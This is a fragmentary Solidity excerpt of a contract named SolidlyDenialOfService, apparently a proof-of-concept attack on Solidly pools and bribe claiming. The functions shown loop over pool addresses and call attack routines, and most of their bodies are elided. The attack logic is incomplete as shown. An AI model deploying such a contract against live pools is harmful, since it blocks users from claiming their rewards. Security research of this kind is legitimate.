...
contract SolidlyDenialOfService {
    ...
    /**
     * @notice Attack bribes for token ID
     */
    ...
    /**
     * @notice Attack bribes and pools
     */
    function attackWithTokenId(address[] memory poolsAddresses, uint256 tokenId)
        external
    {
        attackPools(poolsAddresses, attackSolidClaiming, attackBribeClaiming);
        attackBribesForTokenId(tokenId);
    }
    ...
    /**
     * @notice Attack several Solidly pools simultaneously given an array of pool addresses
     */
    function attackPools(
        ...
        for (
            uint256 poolIndex;
            poolIndex < poolsAddresses.length;
            poolIndex++
        ) {
            address poolAddress = poolsAddresses[poolIndex];
            attackPool(poolAddress, _attackSolidClaiming, _attackBribeClaiming);
        }
    }
